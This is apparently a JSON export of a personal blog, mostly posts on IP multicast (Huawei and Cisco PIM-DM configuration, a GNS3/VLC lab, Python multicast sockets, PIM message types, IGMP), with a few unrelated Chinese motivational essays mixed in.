[Huawei-pim]hello-option override-interval ? INTEGER&lt;1-65535&gt; Override interval in milliseconds 或 [Huawei-GigabitEthernet0/0/1]pim hello-option override-interval ? INTEGER&lt;1-65535&gt; Override interval in milliseconds 9、PIM-DM嫁接（Graft）控制参数配置 设备通过发送嫁接（Graft）报文，使被剪枝网段能够快速的恢复转发。通过调整嫁接控制参数，可以控制组播数据报文的转发来支持不同转发场景。 为使被剪枝网段快速恢复转发，设备会向上游发送Graft报文请求恢复组播数据转发，并同时在发送接口启动定时器。超时后，如果设备仍没有接收到组播数据，会重新向上游发送Graft报文。 [Huawei-GigabitEthernet0/0/1]pim timer graft-retry ? # Graft报文重传的时间间隔 INTEGER&lt;1-65535&gt; Timer interval in seconds 10、禁止PIM-DM状态刷新报文转发 有时候为了避免下游一直没有组播需求的被剪枝接口因为超时而恢复转发，与组播源S直连的PIM设备会触发发送（S，G）状态刷新报文。该报文会逐跳向下游扩散，刷新所有PIM设备上的剪枝定时器。这样没有转发需求的接口将一直处于抑制转发状态。 缺省情况下，设备都具备状态刷新报文的转发能力。如果希望组播数据每一次”扩散-剪枝”时都能在全网扩散，不需要通过设备转发状态刷新报文来抑制被剪枝接口转发组播数据，可在接口上禁止此功能。 状态刷新机制能够很好的减少网络资源浪费，一般情况下不建议禁止接口的状态刷新报文的收发能力。 [Huawei-GigabitEthernet0/0/1]undo pim state-refresh-capable 11调整PIM-DM状态刷新报文时间控制参数 与组播源直连的第一跳PIM设备会周期性的向下游发送状态刷新报文。由于状态刷新报文扩散发送，设备很有可能在短时间内收到重复的状态刷新报文。 为了避免这种情况发生，设备在收到针对某（S，G）的状态刷新报文后，就会启动定时器，时间设为该报文的抑制时间。 在定时器超时前，如果收到相同的状态刷新报文，就会直接丢弃。 11.1、在与组播源直接相连的第一跳设备上配置状态刷新报文的发送周期 [Huawei-pim]state-refresh-interval ? INTEGER&lt;1-255&gt; Specify state refresh interval in seconds 11.2、在所有设备上配置相同状态刷新报文抑制时间 [Huawei-pim]state-refresh-rate-limit ? INTEGER&lt;1-65535&gt; Specify state refresh rate-limit in seconds 12、设置PIM-DM状态刷新报文的TTL值 设备在收到状态刷新报文后，会将状态刷新报文的TTL值减1，然后继续向下游扩散转发来刷新下游设备的剪枝定时器，直至状态刷新报文的TTL值为0。 当网络规模很小而TTL值很大时，会造成状态刷新报文在网络中循环传递。 因此，为了有效控制刷新报文的传递范围，需要根据网络规模大小配置合适的TTL值。 因为状态刷新报文是由与组播源直连的第一跳PIM设备触发发送，所以状态刷新报文的TTL值只在该设备上配置有效。 [Huawei-pim]state-refresh-ttl ? INTEGER&lt;1-255&gt; Specify TTL value of PIM DM state refresh message 13、PIM-DM断言（Assert）控制参数设置 当设备从下游接口接收到组播数据时，说明该网段中还存在其他的上游设备。设备从该接口发出Assert报文，参与竞选唯一上游。 当一个网段内有多个相连的PIM设备RPF检查通过向该网段转发组播数据时，则需要通过断言竞选来保证只有一个PIM设备向该网段转发组播数据。 在竞选中落败的PIM设备会抑制相应下游接口向该网段转发组播数据，但是这种竞选失败的状态只会保持一段时间，这段时间称为Assert报文的保持时间。超时后，落选的设备会重新恢复转发组播数据从而触发新一轮的竞选。 Assert报文保持时间在全局PIM视图下和接口视图下都可配置，如果同时配置，接口视图上的配置生效。 [Huawei-pim]holdtime assert ? INTEGER&lt;7-65535&gt; Specify assert holdtime 或 [Huawei-GigabitEthernet0/0/1]pim holdtime assert ? INTEGER&lt;7-65535&gt; Specify assert holdtime 14、PIM-DM Silent设置 在接入层上，设备直连用户主机的接口上如果需要使能PIM协议，在该接口上可以建立PIM邻居，处理各类PIM协议报文。 此配置同时存在着安全隐患：当恶意主机模拟发送PIM Hello报文时，有可能导致设备瘫痪。为了避免这样的情况发生，可以将该接口设置为PIM Silent状态（即PIM消极状态）。 当接口进入PIM消极状态后，禁止接收和转发任何PIM协议报文，删除该接口上的所有PIM邻居以及PIM状态机，该接口作为静态DR立即生效。同时，该接口上的IGMP功能不受影响。 该功能仅适用于与用户主机网段直连的PIM设备接口，且该用户网段只与这一台PIM设备相连。 配置了该功能后，接口将不再接收和转发任何PIM协议报文，即该接口配置的其他PIM功能将失效，请谨慎使用。 [Huawei-GigabitEthernet0/0/1]pim silent","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"Multicast testing with VLC media player step-step-guide","slug":"EMBEDDED/Multicast testing with VLC media player step-step-guide","date":"2016-05-09T02:32:56.000Z","updated":"2017-07-10T08:50:53.713Z","comments":true,"path":"EMBEDDED/Multicast testing with VLC media player step-step-guide.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/Multicast testing with VLC media player step-step-guide.html","excerpt":"Multicast testing with VLC media player step-step-guide HI STUDENT Today I am doing one practical in which we are doing pract","text":"Multicast testing with VLC media player step-step-guide HI STUDENT Today I am doing one practical in which we are doing practical of dense-mode , same we can do the testing on sparse-mode , please go through it &amp; you will able to run the multicast application on your Gns , Please send your feedback so that I can post more innovative practical BASIC SETUP We HAVE TWO OPTIONS TO TEST MULTICAST WITH GNS3 1)ONE HOST MACHINE AND ONE VIRTUAL MACHINE 2)USE TWO VIRTUAL MACHINES For Second Option You Need a Virtualization Software installed ,That Consumes Lot of Memory SO firstly Start with a Simpler method Method 1 STEP 1) First You Have to setup a Loopback Adaptor on your Host machine This is Steps For Window 7 To setup Loopback Goto to Command Prompt à Type hdwwiz and Hit enter ..You will see Screen Like it Click Next then select Install the hardware that I manually select from a list (Advanced). And Next to continue then on new windowScroll down the list and Select Network Adapters then Click NextàClick Microsoft and Select Microsoft Loopback Adapter and Press Next to Continue Now Your Loopback Interface is setup .You Have Reboot Your Laptop/PC to get it working on GNS3. Here is Our LoopBack 2nd things that we have to Setup is Our Virtual Machine .We will Be using “Qemu” for it .It is Provided with GNS3 Package http://downloads.sourceforge.net/gns-3/Multicast.zip?download This Lab Package is made by GNS3 Officals …We only Need the Image File in Package. Download the Package ,Extract it ,You will se a “IMAGES “ Folder and You Will FOUND a File “multicast.img” in it. This is Actually a small linux OS which provided on GNS3 offcial blog to TEST multicasting.Now How to Setup it with GNS3 OPEN GNS3 =&gt;EDIT =&gt;PREFRENCE=&gt;QEMU IN QEMU WINDOW GO TO “QemuHost” TAB IN IDENTIFIER PUT ANY NAME . IN BINARY IMAGE FIELD GIVE THE PATH OF YOUR “multicast.img” Also You can Increase/decrase the RAM … Then Click on Save ,Click Ok and We Done Now We are ready …Lets start GNS3 and Bulid a Multicast Testing lab Drag the Cloud =&gt; Go to Configure =&gt;Cloud Name (C1) =&gt;Select the Microsoft Loopback Adaptor and click Add. NOTE :You Have to RUN GNS3 As ADMINSTRATOR ALSO DRAG A QEMU HOST OUR TOPOLOGY LOOK LIKE THIS LoopBack Adaptor IP =&gt; 192.168.1.10 GATEWAY =&gt; 192.168.1.1 QEMU HOST IP =&gt; 192.168.100.10 GATEWAY =&gt; 192.168.100.1 WHEN YOU START Qemu HOST ,It Will start Linux OS ..it takes time ,about 5 minuts. Router Config ! version 12.4 service timestamps debug datetime msec service timestamps log datetime msec no service password-encryption ! hostname Router ! boot-start-marker boot-end-marker ! ! no aaa new-model ip cef ! ! ! ! ip multicast-routing ! multilink bundle-name authenticated ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! interface FastEthernet0/0 no ip address shutdown duplex half ! interface Ethernet1/0 ip address 192.168.1.1 255.255.255.0 ip pim dense-mode ip igmp static-group 224.1.1.1 duplex half ! interface Ethernet1/1 ip address 192.168.100.1 255.255.255.0 ip pim dense-mode ip igmp static-group 224.1.1.1 duplex half ! interface Ethernet1/2 no ip address shutdown duplex half ! interface Ethernet1/3 no ip address shutdown duplex half ! interface Ethernet1/4 no ip address shutdown duplex half ! interface Ethernet1/5 no ip address shutdown duplex half ! interface Ethernet1/6 no ip address shutdown duplex half ! interface Ethernet1/7 no ip address shutdown duplex half ! no ip http server no ip http secure-server ! ! ! logging alarm informational ! ! ! ! ! ! control-plane ! ! ! ! ! ! gatekeeper shutdown ! ! line con 0 stopbits 1 line aux 0 line vty 0 4 ! ! End Now Go to Our Linux Machine …Open terminal Type chmod 777 start.sh (to give it execute permission) Then ./start.sh (Execute Script) It will start VLC PLAYER","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"珍惜生命，远离“垃圾人”","slug":"EMBEDDED/珍惜生命，远离“垃圾人”","date":"2016-05-08T00:18:13.000Z","updated":"2017-07-10T08:46:59.318Z","comments":true,"path":"EMBEDDED/珍惜生命，远离“垃圾人”.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/珍惜生命，远离“垃圾人”.html","excerpt":"曾经听一位朋友说起一件事：一次在餐馆吃饭，看见邻桌的一对情侣在吃饭，其漂亮女友被隔壁桌醉汉吹口哨，男友说：“反正吃完了咱走吧“。女友说：“你怎么这么怂啊！是不是男人！“朋友就说：“犯不上跟流氓较劲“。女友急了，骂完朋友又过去骂那群醉汉，结果醉汉围上来开打，","text":"曾经听一位朋友说起一件事：一次在餐馆吃饭，看见邻桌的一对情侣在吃饭，其漂亮女友被隔壁桌醉汉吹口哨，男友说：“反正吃完了咱走吧“。女友说：“你怎么这么怂啊！是不是男人！“朋友就说：“犯不上跟流氓较劲“。女友急了，骂完朋友又过去骂那群醉汉，结果醉汉围上来开打，她的男友被捅三刀，在医院抢救无效死了，临死问了女友一句话：“我现在算男人了么……？“如果你的女朋友被醉汉吹口哨你会怎么做？ 一位朋友在正确的车道上行驶，突然间一辆黑色轿车从停车位开出，正好挡在前面。朋友立即踩剎车，车子滑行了一小段路，刚好闪开来车，两车之间的距离就只差个几厘米！这辆车的司机凶狠地甩头、并且朝着我们大喊大叫！我朋友只是微笑，对那家伙挥挥手。于是我问他：“你刚才为什么那么做？！那家伙差点毁了你的车，还可能伤害我们！“ 我朋友告诉我说：“我把它总结归纳为‘垃圾人定律‘，许多人就像‘垃圾人‘，他们到处跑来跑去，身上充满了负面垃圾，如：沮丧、愤怒、忌妒、算计、仇恨，充满了傲慢与偏见、贪心不满足、抱怨、比较，充满了见不得人好、愚昧、无知、烦恼、报复，也充满了失望。随着心中的垃圾堆积又堆积，他们终需找个地方倾倒；有时候，我们刚好碰上了，垃圾就往我们身上丢….” 所以，无须介意！只要微笑、挥挥手、远离他们，然后继续走我们自己的路就行! 千万别将他们的负面垃圾接收再扩散给我们的家人、朋友、同事、或其它路人！这是生活的底线，快乐、成功的人，绝对不让“垃圾人“接管我们生活的任何一天！人生短暂，绝对不要浪费心思和精力在这些事上！的确如此，生命如此短暂，为何要把心思和精力浪费在如此事如此人上呢~","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"晚安心语：爱情无需太谨慎，缘，让它来，放它走","slug":"EMBEDDED/晚安心语：爱情无需太谨慎，缘，让它来，放它走","date":"2016-05-07T23:59:47.000Z","updated":"2017-07-10T08:46:52.627Z","comments":true,"path":"EMBEDDED/晚安心语：爱情无需太谨慎，缘，让它来，放它走.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/晚安心语：爱情无需太谨慎，缘，让它来，放它走.html","excerpt":"1、命运，一半在上帝那里，一半在自己手里。在你绝望的时候，别忘了一半的命运在自己手里；在你得意忘形的时候，别忘了另一半命运在上帝那里。你一生的努力就是：用你自己手中的一半去获取上帝手中的另一半。这就是命运的一生，这就是一生的命运。 2、幸福就是每","text":"1、命运，一半在上帝那里，一半在自己手里。在你绝望的时候，别忘了一半的命运在自己手里；在你得意忘形的时候，别忘了另一半命运在上帝那里。你一生的努力就是：用你自己手中的一半去获取上帝手中的另一半。这就是命运的一生，这就是一生的命运。 2、幸福就是每天早晨醒来一看表，竟然还能再睡半小时。幸福就是你去自习室上自习，一推开门发现自己想见的那人已在教室里。幸福就是整理衣服时，在去年过冬的衣服里翻出几十块钱。幸福就是开心的听一首歌,看一场电影。幸福就是每天早晨一睁眼,发现自己还活着。 3、别把时间都浪费在埋怨、牢骚上，没有人对不起你；别把自己看得跟故事里的男女主角似的，人家天生漂亮、天性善良，你呢，你能够给自己的优势就是能力，然而，如果你一味的颓废，就连这最后的机会都会丧失，成为一无是处的废物！ 4、单身意味着你有足够的坚强和耐心，去等待那个值得拥有你的人。总有一个人，是一经遇见就再不能割舍的。遇见之前所经历的一切都是为等待，而遇见之后所要经历的一切都是为相守。有一天那个人走进了你的生命，你就会明白，真爱总是值得等待的。 5、爱情无需太谨慎。缘，让它来，放它走。很多时候，我们总是希望得到别人的好。一开始会感激不尽，可是久了便成习惯了，习惯了一个人对你的好，便认为是理所当然了。有一天别人不对你好了，你就会产生怨恨，其实不是别人不好了，而是我们最初的要求变了，总是习惯了得到，却忘记了感恩。 6、爱情如果说最伤人，不是她不爱你，或者，你不爱他。是明明相爱了，她爱不了你，或者说，你爱不了他。望着，却不可以拥抱；想着，却不可以拥有；走着，却不可以同步；说着，却不可以对望。哪怕用尽了一生的力气，透支了一辈子的幸运，一直都无法靠近！ 7、我们都会有这样的时候，执着的去做一件事，执着的去爱一个人，全然都不管对方的态度。其实，承诺并没有什么，不见了也不算什么，所有的一切自有它的归宿…… 只是，只是为什么，在某个落雨的黄昏，在某个寂寂的夜里，你还是隐隐地在我心里淡入、淡出；淡出、淡入，拿不走，抹不掉…… 8、只要心是晴朗的，人生就没有雨天。给自己一份好心情，让世界对着你微笑：给别人一份好心情，让生活对我们微笑，好心情是人生的财富，让好心情与我们时时相伴。一个人活着，就应该好好的生活，请你记得时刻都要快乐着，幸福着。有一种追求，明明是失望，却不愿回头！ 9、一个不爱你的人，你爱上她，那就像是一场赌注，你不停地等，不停地投入自己的感情和时间，只为了赌注一个无法预知的未来。这样的感情，来的不易，守住更难，爱的辛苦，恨的无助，不如放手。 10、放弃并不总意味着你软弱，有时反而说明你足够坚强去舍弃。时间可以争分夺秒，但不能挥霍浪费；每一个明天都是希望。希望是最美好的。世上最残酷的事情莫过于扼杀希望，最善良的事情莫过于培育希望。现实无论怎样的严峻，只要未来有希望，人的意志都不易被摧垮。 11、所要的爱情所要的幸福，只是一天天平淡日子里的执手相看；只是一天天时光流逝中的快乐相随；只是一天天简单地问候；只是相处时温暖的关怀；只是有那么一天，我们走进婚姻时的美丽瞬间！ 12、多希望有一天突然惊醒，发现自己在高三的一节课上睡着了，现在经历的一切都是一场梦，桌上满是你的口水。你告诉同桌，说做了个好长的梦。同桌骂你白痴，叫你好好听课。你看着窗外的球场，一切都那么熟悉，一切还充满希望…… 13、珍惜现在所拥有的，是一种唯美的想法，世间有许多的东西，但真正属于自己的却并不多。看庭前花开花落，荣辱不惊，望天上云卷云舒，去留无意。在这个纷绕的世俗世界里，能够学会用一颗平常的心去对待周围的一切，也是一种境界。 14、也许别人给得了你安慰，也给的了劝慰告诫，却永远不知道你心底是多么的万箭穿心。所以不论有多少的委屈，多么的难受， 记得最终能治愈自己的还是自己。 15、缘不会随意而来，因为相吸；份不会永远无期，故要呵护。没有无缘无故的好，也没有平白无故的爱，别把别人的付出踩在脚下，没有谁本该如此；别以一副高高在上的姿态看以得到的情，人与人是平等的。感情需要平等，还要懂得尊重，不懂得尊重的人，也不会得到真心的情。善待每一个遇见，珍惜每一份情缘。","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"Zatrzymac Cie - Mario Bischin","slug":"EMBEDDED/zatrzymac-cie-mario-bischin","date":"2016-05-07T04:29:04.000Z","updated":"2017-07-10T02:01:05.143Z","comments":true,"path":"EMBEDDED/zatrzymac-cie-mario-bischin.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/zatrzymac-cie-mario-bischin.html","excerpt":"","text":"","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"IP Multicast: GNS3 + Python 实验环境搭建","slug":"EMBEDDED/IP Multicast GNS3 + Python 实验环境搭建","date":"2016-05-06T10:48:22.000Z","updated":"2017-07-10T08:50:19.302Z","comments":true,"path":"EMBEDDED/IP Multicast GNS3 + Python 实验环境搭建.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/IP Multicast GNS3 + Python 实验环境搭建.html","excerpt":"试着搭建了一个实验环境：GNS3作为组播传输网络，Python socket编程实现组播服务器和客户端应用。 拓扑如下： Python_Multicast_Server： #!/usr/bin/env python SENDERIP","text":"试着搭建了一个实验环境：GNS3作为组播传输网络，Python socket编程实现组播服务器和客户端应用。 拓扑如下： Python_Multicast_Server： #!/usr/bin/env python SENDERIP = ‘192.168.1.10’SENDERPORT = 1501MYPORT = 1234MYGROUP = ‘224.1.1.1’MYTTL = 255 # Increase to reach other networks import timeimport structimport socketdef sender(): s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM,socket.IPPROTO_UDP) s.bind((SENDERIP,SENDERPORT)) # Set Time-to-live (optional) ttl_bin = struct.pack(‘@i’, MYTTL) s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ttl_bin) status = s.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, socket.inet_aton(MYGROUP) + socket.inet_aton(SENDERIP)) while True: data = ‘cisco’ s.sendto(data + ‘\\0’, (MYGROUP, MYPORT)) time.sleep(10) if name == “main“: sender() 每隔10秒往组播地址224.1.1.1发送cisco字符串。 组播拓扑配置了IGP和PIM DM Python_Multicast_Receiver: SENDERIP = ‘192.168.247.1’MYPORT = 1234MYGROUP = ‘224.1.1.1’MYTTL = 1 # Increase to reach other networks import timeimport structimport socket SENDERIP = ‘192.168.247.1’SENDERPORT = 1501MYPORT = 1234MYGROUP = ‘224.1.1.1’MYTTL = 1 # Increase to reach other networks def receiver(): #create a UDP socket sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) #allow multiple sockets to use the same PORT number sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) #Bind to the port that we know will receive multicast data sock.bind((SENDERIP,MYPORT)) #tell the kernel that we are a multicast socket sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255) #Tell the kernel that we want to add ourselves to a multicast group #The address for the multicast group is the third param status = sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, socket.inet_aton(MYGROUP) + socket.inet_aton(SENDERIP)); sock.setblocking(0) ts = time.time() while 1: try: data, addr = sock.recvfrom(1024) except socket.error, e: pass else: print “Receive data!” print “TIME:” , ts print “FROM: “, addr print “DATA: “, dataif name == “main“: receiver() 成功收到：后面可以开始分析IGMP，PIM啦","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"PIM协议报文种类及功能","slug":"EMBEDDED/PIM协议报文种类及功能","date":"2016-05-06T10:41:07.000Z","updated":"2017-07-10T08:51:05.069Z","comments":true,"path":"EMBEDDED/PIM协议报文种类及功能.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/PIM协议报文种类及功能.html","excerpt":"PIM是 Protocol Independent Multicast（协议无关组播）的简称，表示可以利用静 态路由或者任意单播路由协议（包括 RIP、OSPF、IS-IS、BGP等）所生成的单播 路由表为 IP组播提供路由。 目前常用PIM为版本号2","text":"PIM是 Protocol Independent Multicast（协议无关组播）的简称，表示可以利用静态路由或者任意单播路由协议（包括 RIP、OSPF、IS-IS、BGP等）所生成的单播路由表为 IP组播提供路由。 目前常用PIM为版本号2为版本。 PIM的类型字段分别为0-8代表9种PIM报文类型。 类型： 0：Hello报文 用于建立邻居，并选择DR。 1：Register报文 （单播） ：组播源发送组播数据时，DR与RP之间，进行注册，形成S，G表项。 2：Register Stop报文 （单播） ：RP向DR发送注册停止报文。 3：Join/Prune报文 加入报文：组播组成员发送Report报文后，DR与RP之间，*，G表项的形成 剪枝报文：PIM-DM模式下，当组播路由器下没有相应的接收者，则组播路由会发出剪枝报文，清除S，G 表项。 PIM-SM模式下，当组播路由器下有组播组的成员要离开组播组时，会向外发送Leave报文，到达DR后，由DR向RP发送剪枝报文，以清除相应的组播路由表项。 4：Bootstrap报文 ：由BSR发出，两个作用：第一：用于C-BSR之间选举BSR。第二：汇总C-RP发出的通告报文，选举RP。 5：Assert报文 ：当一个组播组接收者直连的组播路由器（DR）与上游两台组播路由器相连，并且，两台组播路由器发出相同的组播数据时，两台组播路由器会向所有的PIM路由器发出断言报文，并且从这两台组播路由器中选举出一台组播数据的转发者。 6：Graft报文 :嫁接报文，用于PIM-DM模式下，针对剪枝报文，当组播路由器下，有组播数据的接收者时，组播路由器会向上行路由器发送嫁接报文，以便重新的形成SG表项。 7：Graft Reply报文 ：嫁接回应报文，用于PIM-DM模式下，当上游组播路由器收到嫁接报文时，会回应一个嫁接回应报文，来确认嫁接的过程，如果组播路由发送的嫁接报文没有得到回应，则会一直发送嫁接报文。 8：C-RP Advertisement报文 （单播） ：C-RP通告报文，所有的C-RP向BSR发送通告报文，其中包括优先级和IP地址信息，以单播的形式发送，由BSR选举出RP。 PIM中如果把加入和剪枝报文分开的话，正好有十种消息，其中Hello报文，加入，剪枝报文，断言报文是DM和SM都要使用的报文 三种类型为 1 2 8 的单播报文为PIM-SM协议专用。其它信息是按多播方式发送，目的地址为224.0.0.13","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"PIM-DM协议在linux下的实现方式和工作流程","slug":"EMBEDDED/PIM-DM协议在linux下的实现方式和工作流程","date":"2016-05-06T09:45:44.000Z","updated":"2017-07-10T08:50:57.008Z","comments":true,"path":"EMBEDDED/PIM-DM协议在linux下的实现方式和工作流程.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/PIM-DM协议在linux下的实现方式和工作流程.html","excerpt":"PIM-DM协议只需要从内核接收cache-miss消息。 二、SPT创建过程 1. linux内核协议栈收到组播源S的组播报文后检查MFC表项中是否存在该组播的转发表项，如果没有，内核将生成一条cache-miss消息上送给接收igmp管理报文","text":"PIM-DM协议只需要从内核接收cache-miss消息。 二、SPT创建过程 1. linux内核协议栈收到组播源S的组播报文后检查MFC表项中是否存在该组播的转发表项，如果没有，内核将生成一条cache-miss消息上送给接收igmp管理报文的应用层程序（例如PIM-DM）。 2.PIM-DM的igmp管理报文socket收到来自内核的cache-miss消息后，解包得到组播报文的内容，并通过一系列的计算，随后下发MFC创建命令到内核，创建组播S的(S,G)路由表项。 3.生成的(S,G)转发表项出接口默认选择除入口以外的所有PIM-DM路由口，这样组播报文就会从入口外的所有其他路由接口转发出去。 4.各个收到组播报文的PIM-DM级联路由也会创建相应(S,G)表项，将入口以外的PIM-DM路由接口加入到表项出口和pruned口，并创建对应的剪枝定时器。 5.剪枝定时器到期前，组播报文会向所有PIM-DM路由和接口转发。剪枝定时器到期后，级联路由上的(S,G)表项中剪枝接口会从出口中删除，这样一来报文就无法转发了。 6.PIM-DM路由在加入-剪枝保持定时器到期后会重新发起剪枝过程。以维护SPT树。 7.级联路由在收到组播接收者的加入请求后会将接口者对应的路由口加入(S,G)转发表的出口和pruned口中，并同时向上联路由发送graft(嫁接报文)通告接收者信息，上联路由收到graft报文后会将报文接收端口加入到(S,G)转发表的出口和pruned口中，后面级联的路由同上。 一直到源路由收到此嫁接报文，整条链路上的SPT树通过嫁接操作又完整了。 综上： 以上就是PIM-DM，密集模式的整个处理过程，总结一下就是：源路由向所有路由通告：我把这个组播都给你们先，你们不要的话和我说下哈。 然后需要的路由就保持沉默，不需要的路由就告知源路由：这个组播我不需要，不要给我发了。 过了一段时间，源路由怕其他的路由器有信息更新，于是又问了一次… … and so on.","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"IP Multicast: PIM Dense Mode GNS3实验","slug":"EMBEDDED/IP Multicast PIM Dense Mode GNS3实验","date":"2016-05-06T09:02:54.000Z","updated":"2017-07-10T08:50:22.619Z","comments":true,"path":"EMBEDDED/IP Multicast PIM Dense Mode GNS3实验.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/IP Multicast PIM Dense Mode GNS3实验.html","excerpt":"看一看组播数据包是如何从源到目的在组播网络中转发的。 拓扑如前： R1,R2,R3组播网内运行EIGRP作为IGP。各个接口上启用ip pim dense-mode，并全局开启ip multicast-routing 在sender和recei","text":"看一看组播数据包是如何从源到目的在组播网络中转发的。 拓扑如前： R1,R2,R3组播网内运行EIGRP作为IGP。各个接口上启用ip pim dense-mode，并全局开启ip multicast-routing在sender和receiver程序运行之前，看一下组播路由表。三台路由器几乎没有不同： 因为还没有组播源，所以没有（S，G）表项。 (, 239.255.255.250)这个（，G）表项还没有去详细研究，因为三个路由器都有接口和windows的adapter相连，而239.255.255.250又是SSDP（简单服务发现协议）的多播地址，所以这和windows有关，并且抓包也发现了adapter发了目的地址为239.255.255.250的IGMP membership report消息，本实验室暂不研究。 (, 224.0.1.40)这个（，G）表项我也没从清楚为啥要存在，224.0.1.40是Cisco RP Discovery的组播地址，这个后面再研究吧。。。。（有个视频里说是PIM的，这个就有点扯了，PIM明明是224.0.0.13） 一，先启动Receiver，后启动sender。 1. 启动Receiver_2程序，此时R3的组播路由表多了一个（*，G）表项，其他路由器mroute不变： 木有源，所有不会有（S，G）表项。 2. 启动sender程序。 R1的mroute： 有了（S，G）表项，组播数据流从Ethernet0/1进入的。出接口是0/0和0/2,然后0/2被修剪掉了，为啥R2会发送Prune消息给R1，从R2和R3上可以看。 当从组播源到接收组成员由多条路径时，通过PIM的Assert消息，来决定走哪一条，就是比单播路由AD值和metric值， 先选AD值低的，其次是Metric，最后是最高IP地址，落选的把自己的出口剪除。在此次竞选中R2输了，所以发了Prune消息给R1，裁剪掉了。 R2：flag是P，代表Prune。 R3：和R2的E0/1也是Prune的状态。 二，先启动sender，后启动receiver。 启动sender后，所有组播路由器对于此组播地址的（S，G）表项都是PT的状态，因为没有接收者。 启动receiver_2后： R3发送Graft消息到R1，表明先前被Prune的接口要接收组播数据了，然后就会收到R1发过来的Graft-ACK确认。 R1收到R3的Graft消息，有接收者接收组播数据了，即把PT状态改为T状态，发送graft-ACK给R3，并开始转发组播数据。 简单的PIM-DM模式的数据转发就这样子了，其中有各种情况这里未予考虑。","categories":[{"name":"arm","slug":"arm","permalink":"http://demonelf.github.io/categories/arm/"},{"name":"EMBEDDED","slug":"arm/EMBEDDED","permalink":"http://demonelf.github.io/categories/arm/EMBEDDED/"}],"tags":[]},{"title":"IGMP","slug":"EMBEDDED/igmp","date":"2016-05-06T08:06:36.000Z","updated":"2017-07-10T08:50:15.681Z","comments":true,"path":"EMBEDDED/igmp.html","link":"","permalink":"http://demonelf.github.io/EMBEDDED/igmp.html","excerpt":"一、 Internet 组管理协议 IGMP 是Internet 组管理协议(Internet Group Management Protocol)的缩写。IGMP 在 TCP/IP 协议中的位置: 应用层协议（FTP,HTTP,SMTP）","text":"一、 Internet 组管理协议 IGMP 是Internet 组管理协议(Internet Group Management Protocol)的缩写。IGMP 在 TCP/IP 协议中的位置: 应用层协议（FTP,HTTP,SMTP） TCP UDP ICMP IGMP IP ARP RARP MAC PHY 在了解 IGMP 协议的之前，我们首先看看以太网对报文的处理方法。我们知道，目前使 用的以太网（ethernet）有一个特点，当一个报文在一条线路上传输时，该线路上的所有主 机都能够接收到这个报文。只是当报文到达MAC 层时，主机会检测这个报文是不是发送给 自己的，如果不是该报文就会被丢弃。常用的抓包软件ethereal, sniffer 都可以捕获当前物理 线路上的所有报文，不管该报文的目的地址是不是自己。以太网中有一种特殊的报文广播包 其目的mac 地址全为0xff，所有的主机都必须接收。 说到 IGMP 不能不提”组播”的概念。假如现在一个主机想将一个数据包发给网络上的 若干主机，有什么方法可以做到呢？一个方法是采用广播包发送，这样网络上的所有主机都 能够接收到，另一种方式是将数据包复制若干份分别发给目的主机。这两个方法都存在问题： 方法一，广播的方法导致网络上所有的主机都能接收到，占用了网络上其他主机的资源。方 法二，由于所有目的主机接收的报文都是相同的，采用单播方式显然效率很低。为了解决上 面所述的问题，人们提出了”组播”的概念，控制一个报文发送给对该报文感兴趣的主机， IGMP 就是组播管理协议。 我们来看一个简单的组播应用场景 PC，如何处理呢？首先STB 要发起一个连接请求，也就是IGMP report 报文，加入到电视直播的组播组中。同样当STB 要断开连接的时候就发送一个IGMP leave 报文。Router 也需要知道当前有哪些STB 加入了组播组，防止有的STB 异常掉线了，却依然占用系统资源。Router 周期性的发送IGMP query 报文查询组播组情况，STB 接到query 报文后发送report消息到router。当然还有一种报文就是IGMP data，用来传输组播数据。这基本上就是IGMP协议的基本流程了。 二、 组播实现 1. IP 组播组与组播MAC 二层组播MAC 定义为：01:00:5e:xx:xx:xx，其中xx 由三层的IP 组播组确定。三层地址： 组播流使用的IP 是D 类IP 